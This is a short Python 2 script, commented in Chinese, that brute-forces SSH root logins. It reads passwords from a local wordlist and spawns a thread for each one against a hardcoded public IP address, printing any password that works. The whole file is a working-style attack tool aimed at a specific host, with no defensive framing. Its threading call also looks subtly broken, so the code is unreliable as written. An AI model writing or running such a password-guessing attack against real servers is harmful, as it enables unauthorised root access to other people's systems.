#!/usr/bin/python
# -*- coding:utf8 -*-


import ssh
import  thread

def  dssh_connect(one_txt_buffer_lines):
    try:
        myclient.connect("120.26.205.16", port=22, username="root", password="%s" % one_txt_buffer_lines )
        print 'root，密码是%s' % one_txt_buffer_lines,
    except Exception, e:
#         print '没有找到'
        pass


myclient = ssh.SSHClient()
myclient.set_missing_host_key_policy(ssh.AutoAddPolicy())
txt_buffer =open('/Volumes/lqj/mutou.txt','r')
txt_buffer_lines =txt_buffer.readlines()
print '开始测试'
for one_txt_buffer_lines in txt_buffer_lines:
    one_txt_buffer_lines =one_txt_buffer_lines.replace('\n','')
    try:
        thread.start_new_thread(dssh_connect, one_txt_buffer_lines)
    except Exception, e:
        pass
print '测试结束'
txt_buffer.close()